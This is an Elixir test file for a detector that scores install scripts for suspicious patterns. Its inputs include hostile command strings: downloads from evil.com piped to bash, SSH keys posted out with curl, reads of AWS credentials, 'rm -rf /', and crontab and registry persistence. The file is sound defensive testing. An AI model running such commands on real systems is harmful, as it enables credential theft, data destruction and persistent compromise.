defmodule TamanduaServer.Detection.InstallScriptAnalyzerTest do
  use ExUnit.Case, async: true

  alias TamanduaServer.Detection.InstallScriptAnalyzer

  describe "analyze_script/1 - base64/obfuscation patterns" do
    test "detects FromBase64String PowerShell pattern" do
      command = "powershell -Command $data = [System.Convert]::FromBase64String('...')"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :base64_decode in result.patterns
    end

    test "detects base64 -d Linux pattern" do
      command = "echo SGVsbG8= | base64 -d | bash"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :base64_decode in result.patterns
    end

    test "detects atob JavaScript pattern" do
      command = "node -e 'eval(atob(\"SGVsbG8=\"))'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :base64_decode in result.patterns
    end

    test "detects encoded command PowerShell pattern" do
      command = "powershell -EncodedCommand SGVsbG8gV29ybGQ="
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :encoded_command in result.patterns
    end
  end

  describe "analyze_script/1 - network operations" do
    test "detects Invoke-WebRequest PowerShell pattern" do
      command = "powershell Invoke-WebRequest http://evil.com/payload -OutFile malware.exe"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :network_download in result.patterns
    end

    test "detects curl download pattern" do
      command = "curl http://malicious.com/script.sh | bash"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :network_download in result.patterns
    end

    test "detects wget download pattern" do
      command = "wget https://evil.com/backdoor -O /tmp/backdoor"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :network_download in result.patterns
    end

    test "detects .NET DownloadString pattern" do
      command = "powershell (new-object net.webclient).DownloadString('http://evil.com/script.ps1')"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :dotnet_download in result.patterns
    end

    test "detects URL references" do
      command = "node install.js --registry http://fake-registry.com"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :url_reference in result.patterns
    end
  end

  describe "analyze_script/1 - environment access" do
    test "detects process.env access in Node.js" do
      command = "node -e 'console.log(process.env.AWS_SECRET_KEY)'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :env_access in result.patterns
    end

    test "detects getenv() in C/Python" do
      command = "python -c 'import os; print(os.getenv(\"API_KEY\"))'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :env_access in result.patterns
    end

    test "detects ENV[] access in Ruby" do
      command = "ruby -e 'puts ENV[\"SECRET_TOKEN\"]'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :env_access in result.patterns
    end

    test "detects $env: PowerShell pattern" do
      command = "powershell $env:API_KEY"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :env_access_ps in result.patterns
    end
  end

  describe "analyze_script/1 - code execution" do
    test "detects eval() pattern" do
      command = "node -e 'eval(maliciousCode)'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :code_execution in result.patterns
    end

    test "detects exec() pattern" do
      command = "python -c 'exec(\"import os; os.system(\\\"rm -rf /\\\")\")"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :code_execution in result.patterns
    end

    test "detects new Function() pattern" do
      command = "node -e 'new Function(\"return process.env.API_KEY\")()'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :dynamic_function in result.patterns
    end

    test "detects child_process spawn" do
      command = "node -e 'require(\"child_process\").spawn(\"curl\", [\"http://evil.com\"])'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :process_spawn in result.patterns
    end
  end

  describe "analyze_script/1 - file system operations" do
    test "detects writeFileSync pattern" do
      command = "node -e 'fs.writeFileSync(\"/etc/passwd\", \"malicious\")'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :file_write in result.patterns
    end

    test "detects sensitive file access - SSH keys" do
      command = "cat ~/.ssh/id_rsa | curl -X POST http://evil.com"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :sensitive_file_access in result.patterns
    end

    test "detects AWS credentials access" do
      command = "cat ~/.aws/credentials"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :sensitive_file_access in result.patterns
    end
  end

  describe "analyze_script/1 - obfuscation indicators" do
    test "detects hex escape sequences" do
      command = "python -c 'print(\"\\x48\\x65\\x6c\\x6c\\x6f\")'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :hex_escape in result.patterns
    end

    test "detects String.fromCharCode obfuscation" do
      command = "node -e 'String.fromCharCode(72, 101, 108, 108, 111)'"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :char_encoding in result.patterns
    end
  end

  describe "analyze_script/1 - persistence mechanisms" do
    test "detects crontab modification" do
      command = "echo '* * * * * curl http://evil.com | bash' | crontab -"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :persistence_mechanism in result.patterns
    end

    test "detects Windows registry Run key" do
      command = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /d malware.exe"
      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_script(command)
      assert :persistence_mechanism in result.patterns
    end
  end

  describe "analyze_script/1 - benign scripts" do
    test "returns :ok for benign console.log" do
      command = "node -e 'console.log(\"Installing package...\")'"
      assert :ok = InstallScriptAnalyzer.analyze_script(command)
    end

    test "returns :ok for npm install command" do
      command = "npm install lodash --save"
      assert :ok = InstallScriptAnalyzer.analyze_script(command)
    end

    test "returns :ok for cargo build" do
      command = "cargo build --release"
      assert :ok = InstallScriptAnalyzer.analyze_script(command)
    end
  end

  describe "extract_suspicious_patterns/1" do
    test "extracts all matched pattern names and weights" do
      command = "curl http://evil.com | base64 -d | eval"
      patterns = InstallScriptAnalyzer.extract_suspicious_patterns(command)

      assert length(patterns) == 3
      assert {:network_download, _} = Enum.find(patterns, fn {name, _} -> name == :network_download end)
      assert {:base64_decode, _} = Enum.find(patterns, fn {name, _} -> name == :base64_decode end)
      assert {:code_execution, _} = Enum.find(patterns, fn {name, _} -> name == :code_execution end)
    end

    test "returns empty list for benign command" do
      command = "echo 'Hello World'"
      patterns = InstallScriptAnalyzer.extract_suspicious_patterns(command)
      assert patterns == []
    end
  end

  describe "calculate_risk_score/1" do
    test "uses complement product formula for risk score" do
      # Single pattern with weight 0.8: score = 1 - (1 - 0.8) = 0.8
      patterns = [{:base64_decode, 0.8}]
      score = InstallScriptAnalyzer.calculate_risk_score(patterns)
      assert_in_delta score, 0.8, 0.01
    end

    test "combines multiple patterns correctly" do
      # Two patterns: 0.7 and 0.5
      # Score = 1 - ((1 - 0.7) * (1 - 0.5)) = 1 - (0.3 * 0.5) = 1 - 0.15 = 0.85
      patterns = [{:network_download, 0.7}, {:url_reference, 0.5}]
      score = InstallScriptAnalyzer.calculate_risk_score(patterns)
      assert_in_delta score, 0.85, 0.01
    end

    test "high-risk pattern dominates score" do
      # sensitive_file_access (0.95) + others
      patterns = [{:sensitive_file_access, 0.95}, {:network_download, 0.7}]
      score = InstallScriptAnalyzer.calculate_risk_score(patterns)
      # 1 - ((1 - 0.95) * (1 - 0.7)) = 1 - (0.05 * 0.3) = 1 - 0.015 = 0.985
      assert_in_delta score, 0.985, 0.01
    end
  end

  describe "analyze_scripts/1 - batch analysis" do
    test "combines results from multiple command lines" do
      commands = [
        "curl http://evil.com",
        "base64 -d payload",
        "eval(maliciousCode)"
      ]

      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_scripts(commands)
      assert :network_download in result.patterns
      assert :base64_decode in result.patterns
      assert :code_execution in result.patterns
      assert result.count == 3
    end

    test "returns :ok when all scripts are benign" do
      commands = [
        "npm install lodash",
        "echo 'Installing...'",
        "cargo build"
      ]

      assert :ok = InstallScriptAnalyzer.analyze_scripts(commands)
    end

    test "returns max risk score from batch" do
      commands = [
        "curl http://evil.com",  # 0.7 score
        "cat ~/.ssh/id_rsa"      # 0.95 score (sensitive file)
      ]

      assert {:suspicious, result} = InstallScriptAnalyzer.analyze_scripts(commands)
      # Should be close to 0.95 (the max score)
      assert result.risk_score >= 0.9
    end
  end
end
